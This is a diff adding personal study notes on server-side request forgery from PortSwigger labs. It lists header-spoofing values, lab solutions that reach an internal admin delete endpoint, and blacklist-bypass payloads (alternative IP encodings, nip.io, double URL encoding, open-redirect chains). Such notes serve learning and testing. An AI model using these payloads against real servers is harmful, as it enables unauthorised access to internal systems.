@@ -1,0 +1,169 @@
+SSRF : 
+
+Server side access, 
+Like using some headers , 
+
+X-Forwarded-For: 127.0.0.1
+X-Forwarded-For: localhost:8080
+X-Forwarded-For: 168.10.1..0
+Base-Url: 127.0.0.1
+Client-IP: 127.0.0.1
+Http-Url: 127.0.0.1
+Proxy-Host: 127.0.0.1
+Proxy-Url: 127.0.0.1
+Real-Ip: 127.0.0.1
+Redirect: 127.0.0.1
+Referer: 127.0.0.1
+Referrer: 127.0.0.1
+Refferer: 127.0.0.1
+Request-Uri: 127.0.0.1
+Uri: 127.0.0.1
+Url: 127.0.0.1
+X-Client-IP: 127.0.0.1
+X-Custom-IP-Authorization: 127.0.0.1
+X-Forward-For: 127.0.0.1
+X-Forwarded-By: 127.0.0.1
+X-Forwarded-For-Original: 127.0.0.1
+X-Forwarded-For: 127.0.0.1
+X-Forwarded-Host: 127.0.0.1
+X-Forwarded-Port: 443
+X-Forwarded-Port: 4443
+X-Forwarded-Port: 80
+X-Forwarded-Port: 8080
+X-Forwarded-Port: 8443
+X-Forwarded-Scheme: http
+X-Forwarded-Scheme: https
+X-Forwarded-Server: 127.0.0.1
+X-Forwarded: 127.0.0.1
+X-Forwarder-For: 127.0.0.1
+X-Host: 127.0.0.1
+X-Http-Destinationurl: 127.0.0.1
+X-Http-Host-Override: 127.0.0.1
+X-Original-Remote-Addr: 127.0.0.1
+X-Original-Url: 127.0.0.1
+X-Originating-IP: 127.0.0.1
+X-Proxy-Url: 127.0.0.1
+X-Real-Ip: 127.0.0.1
+X-Remote-Addr: 127.0.0.1
+X-Remote-IP: 127.0.0.1
+X-Rewrite-Url: 127.0.0.1
+X-True-IP: 127.0.0.1
+
+First lab 1 : 
+Solved by an , 
+http%3A%2F%2Fstock.weliketoshop.net%3A8080%2Fproduct%2Fstock%2Fcheck%3FproductId%3D1%26storeId%3D1
+TO
+http%3A%2F%2Flocalhost/admin/delete?username=carlos
+
+it will access some link behind the server, but here it was easily done, by localhost changig by that 
+
+
+
+Lab 2 : 
+http://192.168.0.68/
+
+having this, 
+and we incrementing the 68 
+by bruteforce, 
+and it revel the admin interface
+
+here , basically the endpoint /product/stock 
+will access in background stock endpoint via : http://192.168.0.1:8080/product/stock/check?productId=1&storeId=1
+
+here the 1 may also have an upto 255 , because of bit range of ip 
+so we need to bruteforce to get an admin interface
+
+http://192.168.0.121:8080/admin/delete?username=carlos
+
+
+Lab 3 :  In this we cover an defence based ssrf
+Many developers try to prevent SSRF by blocking known bad inputs using blacklists. For example, they reject any URL containing:
+127.0.0.1
+localhost
+192.168.*
+10.*
+172.16.* to 172.31.* (private ranges)
+.internal
+/admin, /debug, etc.
+
+For these defence we can use an : 
+Use Alternative IP Representations of 127.0.0.1
+Representation,How It Works,Example URL
+Decimal - 2130706433 = 127.0.0.1
+Octal - 0177.0.0.1 or 017700000001
+Dotted decimal variants - "127.1, 127.0.1, 127.127.127.127"
+Hexadecimal - 0x7f.0x0.0x0.0x1 → 0x7f000001
+Mixed formats,"Combine decimal, octal, hex",127.0.0.0177
+
+Test like this : 
+http://2130706433/admin
+http://017700000001/admin
+
+Register Your Own Domain That Resolves to 127.0.0.1
+You can make any domain point to 127.0.0.1 via your local /etc/hosts file or DNS spoofing — but in labs, PortSwigger provides Burp Collaborator.
+
+Example:
+texthttp://127.0.0.1.nip.io/admin
+→ nip.io resolves this to 127.0.0.1 automatically.
+Or in Burp labs:
+texthttp://your-unique-id.burpcollaborator.net/admin
+The server resolves it → goes to localhost → bypasses blacklist that only blocks localhost or 127.0.0.1
+
+3. Obfuscate Blocked Strings Using URL Encoding or Case Variation
+Many filters do naive string matching.
+Original,Encoded Example,Result After Decoding
+127.0.0.1,127.0.0.%31,Becomes 127.0.0.1
+localhost,%6c%6f%63%61%6c%68%6f%73%74,"Decodes to ""localhost"""
+Double encoding,%252e%252e%252f → decodes twice to ../,Bypasses filters checking %2e%2e/
+
+Case Variation
+Some filters are case-sensitive:
+LoCaLhOsT
+LOCALHOST
+127.0.0.1.toUpperCase() → doesn't trigger lowercase checks
+
+Also works with paths:
+/ADMIN, /AdMiN, etc.
+
+Embedded Tabs/Newlines (rarely works now)
+texthttp://localhost%09/admin
+http://127.0.0.1%250a/admin
+
+4. Use Open Redirects to Redirect to the Forbidden URL
+This is one of the most powerful and common bypasses.
+Idea:
+
+Find an open redirect vulnerability elsewhere in the app (very common)
+Example: https://example.com/redirect?url=https://google.com
+Attacker can set: https://example.com/redirect?url=http://localhost/admin
+
+Now send this full URL to the SSRF endpoint:texthttps://vulnerable.com/fetch?url=https://example.com/redirect?url=http://localhost/admin
+
+Advanced Redirect Tricks
+
+Use 301, 302, 303, 307, 308 — some filters only block 302
+Redirect from HTTP → HTTPS or vice versa — some filters treat them differently
+Use relative redirects: Location: /admin when base is internal
+Chain multiple redirects
+
+Example payload:
+text?url=https://normal-external-site.com/redirect-to-localhost
+
+Summary Table of Blacklist Bypass Techniques :  
+Technique,Example Payload,Bypasses Filters Looking For
+Decimal IP,http://2130706433/admin,"127.0.0.1, localhost"
+Octal IP,http://017700000001/admin,Same
+Alternative localhost,http://localhost:80@localhost,Simple checks
+DNS that resolves to 127.0.0.1,http://127.0.0.1.nip.io/admin,Domain blacklists only
+URL encoding,http://%31%32%37%2e%30%2e%30%2e%31/admin,Exact string match
+Open redirect,http://example.com/redirect?url=http://localhost/admin,Direct internal access
+
+solution for an lab : 
+try : 
+127.0.0.1 - > Blocked
+127.1 -> accessed
+127.1/admin -> blocked
+127.1/admi%6e -> url encode of N - > %6e  --> blocker
+127.1/admi%25%36%65  --> double URL encode -> access
+
+
